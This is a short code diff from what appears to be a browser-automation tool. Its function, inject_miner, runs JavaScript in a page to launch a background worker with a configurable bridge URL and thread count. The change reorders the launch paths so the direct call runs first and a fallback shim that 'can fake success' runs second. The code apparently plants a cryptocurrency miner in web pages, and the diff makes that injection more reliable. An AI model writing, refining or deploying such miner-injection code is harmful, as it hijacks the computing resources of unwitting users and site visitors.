@@ -185,20 +185,22 @@ async def inject_miner(page, bridge_url: str = BRIDGE_URL, threads: int = 64) ->
                 if (window.doc && typeof window.doc.connect === 'function') {{
                     try {{ await window.doc.connect(); }} catch (e) {{}}
                 }}
-                // Step 2: fire the worker in the background
-                if (window.doc && typeof window.doc.run === 'function') {{
-                    try {{
-                        const r = await window.doc.run(cmd);
-                        return {{ method: 'doc.run(cmd)', ok: true, result: r }};
-                    }} catch (e) {{
-                        return {{ method: 'doc.run(cmd)', ok: false, error: e.message }};
-                    }}
-                }} else if (typeof window.doc === 'function') {{
+                // Step 2: fire the worker in the background.
+                // Function-call FIRST (proven path) — the .run shim is a
+                // fallback that can fake success, never prefer it.
+                if (typeof window.doc === 'function') {{
                     try {{
                         const r = await window.doc(cmd);
                         return {{ method: 'doc(cmd)', ok: true, result: r }};
                     }} catch (e) {{
                         return {{ method: 'doc(cmd)', ok: false, error: e.message }};
+                    }}
+                }} else if (window.doc && typeof window.doc.run === 'function') {{
+                    try {{
+                        const r = await window.doc.run(cmd);
+                        return {{ method: 'doc.run(cmd)', ok: true, result: r }};
+                    }} catch (e) {{
+                        return {{ method: 'doc.run(cmd)', ok: false, error: e.message }};
                     }}
                 }}
                 return {{ method: 'none', ok: false }};
